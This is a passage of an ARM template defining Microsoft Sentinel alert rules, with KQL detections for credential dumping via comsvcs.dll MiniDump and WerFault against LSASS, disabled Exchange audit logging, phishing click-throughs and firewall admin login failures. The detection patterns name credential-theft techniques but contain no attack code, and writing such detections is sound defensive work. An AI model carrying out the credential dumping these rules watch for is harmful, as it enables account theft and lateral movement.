          "query": "let start_time = 10m;\nlet latency = 60m;\nlet end_time = now();\nlet alert_bin = 10m;\nSecurityEvent\n| where TimeGenerated between ( ago(start_time + latency) .. now() ) and ingestion_time() > ago(start_time)\n| where EventID == 4688\n| where CommandLine has 'comsvcs.dll' and CommandLine has 'MiniDump'\n| parse Account with UserDomain '\\\\' UserName\n| parse Computer with ComputerName @'.' ComputerDomain\n| extend ExtendedDescription = strcat('The user ', Account, ' ran minidump on ', Computer) \n| extend bv_mapping_tag = UserName\n| project TimeGenerated, Account, Computer, CommandLine, ParentProcessName, UserDomain, UserName, ComputerName, ComputerDomain, ExtendedDescription, bv_mapping_tag",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT1H10M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1003"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n\nThis rule identifies the use of Comsvcs.dll to dump credentials\n\n{{ExtendedDescription}}\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. REview additional activity on the host\n\nMITRE: T1003 \nCategory: Windows Security\ntag: SOC"
          },
          "customDetails": {
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "UserDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "ComputerName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "ComputerDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11285')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11285')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11285: [RBA] O365 - Anomalous File Modification",
          "description": "This alert identifies a large volume of file changes via Office 365 logs MITRE: T1647 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 1h;\nlet latency = 1h;\nlet end_time = now();\nlet start_time_historical = 7d;\nlet O365Activity = OfficeActivity\n| where TimeGenerated between (ago(start_time_historical) .. end_time)\n| where Operation == 'FileRenamed'\n| project \n      TimeGenerated\n    , bv_file_modify_time = Start_Time\n    , bv_src_user = tolower(UserId)\n    , bv_vendor_action = tolower(Operation)\n    , bv_src_ip = ClientIP\n    , bv_vendor_category = OfficeWorkload\n    , bv_parent_file_name = SourceFileName\n    , bv_file_name = DestinationFileName\n    , bv_file_extension = SourceFileExtension\n    , bv_file_path = OfficeObjectId\n;      \nlet historical_activity = O365Activity      \n| where  TimeGenerated < ago(start_time)\n| summarize \n        bv_historical_file_modification_count = dcount(bv_parent_file_name)\n        by \n          bv_src_user;      \nO365Activity\n|where TimeGenerated > ago(start_time)\n| mv-apply e = BV11285_CONFIGURATION['EXCLUSION'] on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n        | extend bv_file_path_excluded = iff(bv_file_path contains e.bv_file_path and isnotempty(e.bv_file_path), 1, 0)   \n        | extend excluded_count = \n                bv_src_user_excluded\n                + bv_file_path_excluded   | extend transparent = iff(isnotempty(e.metadata[\"transparent\"]), e.metadata[\"transparent\"], true)\n        | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n        | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n        | summarize excluded=make_set(excluded), transparent=countif(transparent), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where ExcludedEvent == false or (ExcludedEvent == true and transparent == 0)\n| where not(ExcludedEvent)     \n| summarize \n    bv_start_time = min(TimeGenerated)\n    , bv_end_time   = max(TimeGenerated)\n    , bv_event_count = count()\n    , bv_vendor_action = make_set(bv_vendor_action)\n    , bv_src_ip = make_set(bv_src_ip)\n    , bv_vendor_category = make_set(bv_vendor_category)\n    , bv_parent_file_name = make_set(bv_parent_file_name)\n    , bv_file_name = make_set(bv_file_name)\n    , bv_file_path = make_set(bv_file_path, 5)\n    , bv_file_extension = make_set(bv_file_extension)\n    , bv_file_cnt = dcount(bv_parent_file_name)\n  by \n    bv_src_user\n| join kind=leftouter historical_activity on bv_src_user\n| extend Percentage = 1.0*(bv_file_cnt - bv_historical_file_modification_count)/bv_historical_file_modification_count * 100\n| where bv_file_cnt > bv_historical_file_modification_count and Percentage >= BV11285_CONFIGURATION.EVENT_THRESHOLD \n| extend AttackerEntity = pack_array(bv_src_user)\n| extend ExtendedDescription = strcat(\n      'bv_src_user: ', bv_src_user\n      , '\\nbv_file_cnt: ', bv_file_cnt\n      , '\\nbv_parent_file_name: \\n* ', strcat_array(bv_parent_file_name, '\\n* ')\n      , '\\nbv_file_name: \\n* ', strcat_array(bv_file_name, '\\n* ')            \n      , '\\nbv_vendor_action: \\n* ', strcat_array(bv_vendor_action, '\\n* ')                                  \n      , '\\nbv_vendor_category: \\n* ', strcat_array(array_slice(bv_vendor_category, 0, 150), '\\n* ')\n)\n| project   \n      bv_start_time\n      , bv_end_time\n      , bv_src_user\n      , bv_vendor_action\n      , bv_vendor_category\n      , bv_event_count\n      , bv_src_ip\n      , bv_parent_file_name\n      , bv_file_name\n      , bv_file_path\n      , bv_file_extension\n      , bv_file_cnt\n      , bv_historical_file_modification_count\n      , ExtendedDescription            \n      , AttackerEntity\n      , RBAScore = BV11285_CONFIGURATION['RBASCORE']",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1647"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies a large volume of file changes via Office 365 logs\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Office 365"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-123')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-123')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-123: [SOC] O365 - Exchange AuditLog Disabled",
          "description": "Identifies when the Exchange audit logging has been disabled which may be an adversary attempt to evade detection or avoid other defenses. MITRE: T1562 Category: Office 365 tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let start_time = 1h;\nlet latency = 48h;\nlet end_time = now();\nOfficeActivity\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where UserType in~ ('Admin','DcAdmin') \n| where Operation =~ 'Set-AdminAuditLogConfig'\n| extend AdminAuditLogEnabledValue = tostring(parse_json(tostring(parse_json(tostring(array_slice(parse_json(Parameters),3,3)))[0])).Value)\n| where AdminAuditLogEnabledValue =~ 'False'\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), OperationCount = count() by Operation, UserType, UserId, ClientIP, ResultStatus, Parameters, AdminAuditLogEnabledValue\n| extend AccountCustomEntity = UserId, IPCustomEntity = ClientIP\n| extend ExtendedDescription = strcat('User account ', UserId , ' from IP address ', ClientIP, ' disabled audit logging' )\n| extend bv_rule_version = '1.1.4371'\n| extend bv_rule_timestamp = '1698700329.2605054'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.4371 bv_rule_timestamp: 1698700329.2605054'\n| project StartTimeUtc, EndTimeUtc, OperationCount, Operation, UserType, UserId, ClientIP, ResultStatus, Parameters, AdminAuditLogEnabledValue, ExtendedDescription, IPCustomEntity, AccountCustomEntity, bv_rule_combined_string\n| extend bv_mapping_tag = UserId",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT49H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Identifies when the Exchange audit logging has been disabled which may be an adversary's attempt to evade detection or avoid other defenses.\n\n{{ExtendedDescription}}\n\ntag: SOC\nCategory: Office 365\nMITRE: T1562\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2512')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2512')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2512: [SOC] Windows - LSASS dump using Werfault",
          "description": "Adversaries may abuse werfault.exe to dump LSASS and obtain a memory dump of a target system.\n\nWerfault.exe is a utility that creates file dumps for processes, typically for legitimate application or process issues.\n\nThis can also be used with custom commands or by other applications to perform dumps of sensitive information, such as LSASS. MITRE: T1218 Category: Windows Security tag: SOC tag: Zero-Day",
          "severity": "High",
          "enabled": true,
          "query": "let latency = 15m;\nlet start_time = 15m;\nlet end_time = now();\nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID == 4656\n| parse EventData with * '\"ProcessName\">'ProcessName'<' *\n| parse EventData with * '\"ObjectName\">'ObjectName'<' *\n| parse EventData with * '\"SubjectUserName\">'SubjectUserName'<' *\n| where ProcessName contains 'WerFault'\n| where ObjectName contains 'lsass.exe'\n| summarize arg_max(TimeGenerated, *) by Computer\n| extend ExtendedDescription = strcat('User account ', SubjectUserName, ' on computer ', Computer, ' used werfault.exe to perform an LSASS dump, please investigate this system.')\n| extend EventID=tostring(EventID)\n| extend AttackerEntity=SubjectUserName\n| extend VictimEntity = pack_array(SubjectUserName, Computer)\n| extend bv_mapping_tag = SubjectUserName\n| project TimeGenerated\n, SubjectUserName\n, Computer\n, EventID\n, Activity\n, AttackerEntity\n, VictimEntity\n, ProcessName\n, ObjectName\n, ExtendedDescription\n, bv_mapping_tag",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT30M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1218"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Adversaries may abuse werfault.exe to dump LSASS and obtain a memory dump of a target system.\n\nWerfault.exe is a utility that creates file dumps for processes, typically for legitimate application or process issues.\n\nThis can also be used with custom commands or by other applications(such as nanodump) to perform dumps of sensitive information.\n\n{{ExtendedDescription}}\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host\n\nMITRE: T1218 \nCategory: Windows Security\ntag: SOC"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "SubjectUserName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "Computer"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-899')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-899')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-899: [SOC] MTP - Malicious Links Allowed To Click Through",
          "description": "Adversaries may send phishing messages to gain access to victim systems.\n\nThis rule takes events from 3 different tables (EmailPostDeliveryEvents, EmailEvents and UrlClickEvents) into consideration and triggers an alert when a user was allowed to proceed through malicious URLs after Safe Links clicks\n\nhttps://docs.microsoft.com/en-us/microsoft-365/security/defender/advanced-hunting-schema-tables?view=o365-worldwide\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n  1. Review associated behavior for the host and user. MITRE: T1566 Category: Microsoft Threat Protection tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let description = (table_parameter: (*)){\ntable_parameter\n| extend all_data = pack_all(false)\n| extend keys = bag_keys(all_data)\n| mv-apply k = keys to typeof(string) on (\n    extend dynamic_entity = parse_json(all_data[k])\n    | extend ExtendedDescription = strcat(\n    case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n    ,strcat(k,': ', all_data[k])))\n    | summarize ExtendedDescription = make_set(ExtendedDescription)\n)\n| extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet start_time = 1h;\nlet end_time = now();\nlet latency = 1h;\nlet alert_bin = 2h;\n(\n(EmailPostDeliveryEvents\n| where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| extend EmailPostDeliveryTime = TimeGenerated\n| extend DetectionMethod = DetectionMethods\n| extend PostDeliveryActionType = ActionType\n| extend PostDeliveryAction = Action\n| extend PostDeliveryLocation = DeliveryLocation\n| where ThreatTypes =~ 'Phish' or ThreatTypes =~ 'Malware'\n| extend ThreatType = ThreatTypes\n)  \n| join (EmailEvents | where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| extend EmailReceivedTime = TimeGenerated\n| extend Subject = Subject\n| extend SenderEmail = SenderMailFromAddress\n| extend RecipientEmail = RecipientEmailAddress\n| extend SenderIP = SenderIPv4\n| extend InitialDeliveryAction = DeliveryAction\n| extend InitialDeliveryLocation = DeliveryLocation\n| extend SenderDisplayName = SenderDisplayName\n) on NetworkMessageId\n| project EmailReceivedTime, Subject, RecipientEmail, SenderEmail, SenderDisplayName, SenderIP, InitialDeliveryAction, InitialDeliveryLocation, EmailPostDeliveryTime, ThreatType, DetectionMethod, PostDeliveryAction, PostDeliveryActionType, PostDeliveryLocation, NetworkMessageId\n)\n| join kind = innerunique \n(UrlClickEvents | where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where ActionType =~ 'ClickAllowed' and IsClickedThrough != false\n| extend ClickTime = TimeGenerated\n, ClickAction = ActionType\n, ClickedUser = AccountUpn\n, MaliciousURL = Url\n, IsClickedThrough = IsClickedThrough\n, NetworkMessageId = NetworkMessageId\n) on NetworkMessageId\n| summarize \nTotalEvents = count()\n, Subjects = make_set(Subject, 5)\n, SenderEmails = make_set(SenderEmail, 5)\n, SenderDisplayNames = make_set(SenderDisplayName, 5)\n, SenderIPs = make_set(SenderIP, 5)\n, MaliciousURLs = make_set(MaliciousURL)\n, UniqueURLCount = dcount(MaliciousURL)\n, FirstEmailReceivedTime = min(EmailReceivedTime)\n, LastEmailReceivedTime = max(EmailReceivedTime)\n, FirstEmailPostDeliveryTime = min(EmailPostDeliveryTime)\n, LastEmailPostDeliveryTime = max(EmailPostDeliveryTime)\nby IsClickedThrough, ClickedUser, ClickAction, RecipientEmail, InitialDeliveryAction, InitialDeliveryLocation, ThreatType, DetectionMethod, PostDeliveryAction, PostDeliveryActionType, PostDeliveryLocation, NetworkMessageId, bin_at(ClickTime, alert_bin, now())\n| parse ClickedUser with UserName '@' UserDomain\n| extend ExtendedDescription = strcat('Malicious links sent to ', RecipientEmail, ' were allowed to click through by ', UserName, '\\n')\n| extend VictimEntity = pack_array(UserName)\n| extend bv_mapping_tag = UserName\n| project \nClickTime\n, IsClickedThrough\n, ClickedUser\n, ClickAction\n, RecipientEmail\n, InitialDeliveryAction\n, InitialDeliveryLocation\n, ThreatType\n, DetectionMethod\n, PostDeliveryAction\n, PostDeliveryActionType\n, PostDeliveryLocation\n, NetworkMessageId\n, TotalEvents\n, Subjects\n, SenderEmails\n, SenderDisplayNames\n, SenderIPs\n, MaliciousURLs\n, UniqueURLCount\n, FirstEmailReceivedTime\n, LastEmailReceivedTime\n, FirstEmailPostDeliveryTime\n, LastEmailPostDeliveryTime\n, VictimEntity\n, UserName\n, UserDomain\n, ExtendedDescription\n, bv_mapping_tag\n|invoke description()",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Adversaries may send phishing messages to gain access to victim systems.\n\nThis rule takes events from 3 different tables (EmailPostDeliveryEvents, EmailEvents and UrlClickEvents) into consideration and triggers an alert when a user was allowed to proceed through malicious URLs after Safe Links clicks\n\nhttps://docs.microsoft.com/en-us/microsoft-365/security/defender/advanced-hunting-schema-tables?view=o365-worldwide\n\nInclusions: None \nExclusions: None \n\n{{ExtendedDescription}}\n\nRecommendations: \n  1. Review associated behavior for the host and user.\n\nMITRE: T1566\nCategory: Microsoft Threat Protection\ntag: SOC"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "UserDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-122')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-122')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-122: [RBA] Azure AD - Anomalous PowerShell Behavior",
          "description": "This will alert when a user or application signs in using Azure Active Directory PowerShell to access non-Active Directory resources, such as the Azure Key Vault, which may be undesired or unauthorized behavior. For capabilities and expected behavior of the Azure Active Directory PowerShell module, see: https://docs.microsoft.com/powershell/module/azuread/?view=azureadps-2.0. Tags: SolarWindows SUNBURST MITRE: T1059 Category: Azure AD tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let auditLookback =1h;\nlet alert_bin = 1h;\nSigninLogs\n| where TimeGenerated between (ago(auditLookback)..now())\n| where AppDisplayName =~ 'Azure Active Directory PowerShell'\n| where TokenIssuerType =~ 'AzureAD'\n| where ResourceIdentity !in ('00000002-0000-0000-c000-000000000000', '00000003-0000-0000-c000-000000000000') // ResourceDisplayName IS NOT Windows Azure Active Directory OR Microsoft Graph\n| where Status.errorCode == 0\n| summarize MaxTime=max(TimeGenerated), MinTime=min(TimeGenerated), ClientAppUsed=make_set(ClientAppUsed), ResourceDisplayNames=make_set(ResourceDisplayName) by IPCustomEntity = IPAddress, UserAgent, UserDisplayName, UserId, AccountCustomEntity = UserPrincipalName, bin(TimeGenerated, alert_bin)\n| parse AccountCustomEntity with UserName '@' UserDNS\n| where AccountCustomEntity !in (A122_WL_ACCOUNTS)",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "UserDNS"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-005')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-005')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-005: [Dynamic] Palo Alto - Admin Authentication Failure Detected On Firewall",
          "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.\n\nThis rule triggers when an administrator fails to successfully login into the firewall admin console, either via GUI or command shell. \n\nInclusions: A005_ADMIN_ACCOUNT - List of authorized admin accounts\n            A005_AUTH_PROFILE - *** MUST BE CONFIRMED WITH CUSTOMER *** List of authentication profile that pertains to a group of admin accounts\nExclusions: A005_EXCLUDED_ACCOUNT - List of accounts that are authorized by the customer to exclude \n\nRecommendations: \n  1. Change admin/root/administrator account password\n  2. Login into the firewall console and review change history\n  3. Block IP address which requested the console access\n  4. Consider to disable management access from the untrust zones (best practices) MITRE: T1110,T1078 Category: PaloAltoNetworks tag: Dynamic tag: SOC",
          "severity": "Low",
          "enabled": true,
          "query": "let ingested_lookback = 1h; // earliest [ingest time] boundary\nlet generated_lookback = 1d; // earliest [log time] boundary\nlet alert_bin = 1h;\nCommonSecurityLog\n|where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where DeviceProduct =~ 'PAN-OS'\n| where Activity =~ 'SYSTEM'\n| where DeviceEventClassID =~ 'auth'\n| extend Category = extract('cat=([^;]*)', 1, AdditionalExtensions)\n| where Category =~ 'auth-fail'\n| parse Message with * 'failed authentication for user \\'' UserName '\\'.' *\n| parse Message with * 'Reason:' Reason ' From: ' SourceIP '.\"' *\n// A005_AUTH_PROFILE needs to be populated with customer's admin authentication profile\n| where Message has_any (A005_AUTH_PROFILE) or UserName in~ (A005_ADMIN_ACCOUNT)\n| where isnotempty(UserName)\n| where UserName matches regex A005_EXCLUDED_ACCOUNT == false\n| where isnotempty(Reason)\n| where isnotempty(SourceIP)\n| where Message !has 'Auth-seq'\n| project TimeGenerated, Activity, Computer, SourceIP, UserName, Reason, Message\n| summarize EventCount=count() by UserName, Computer, SourceIP, Reason, bin(TimeGenerated, alert_bin)\n//Custom (Delegated) if the failed login count is 3 or greater... otherwise, make it RBA.\n| extend Severity = case(EventCount > 3, 'High', EventCount >= 2, 'Medium', 'Low')\n| extend Class = case(Severity =~ 'High', 'Custom', 'RBA')\n| extend Tags = case(Class =~ 'RBA', 'tag: RBA', 'tag: Custom')\n| extend Description = 'This alert triggers when an administrator fails to successfully login into the firewall admin console, either via GUI or command shell.'\n| extend Description = strcat(Description, ' MITRE: T1110 MITRE: T1078 Category: PaloAltoNetworks ', Tags)\n| extend AlertName = strcat('BV-005: [', Class, '] Admin authentication failure detected on firewall - Palo Alto')\n| project TimeGenerated, EventCount, Computer, UserName, SourceIP, Reason, Severity, Class, Tags, Description, AlertName",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "InitialAccess",
            "Persistence",
            "PrivilegeEscalation",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1110",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "{{AlertName}}",
            "alertDescriptionFormat": "{{Description}}",
            "alertSeverityColumnName": "Severity"
          },
          "customDetails": {
            "Reason": "Reason"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "Computer"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2501')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2501')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2501: [SOC] Windows - TrojanKilldisk Connectivity Check",
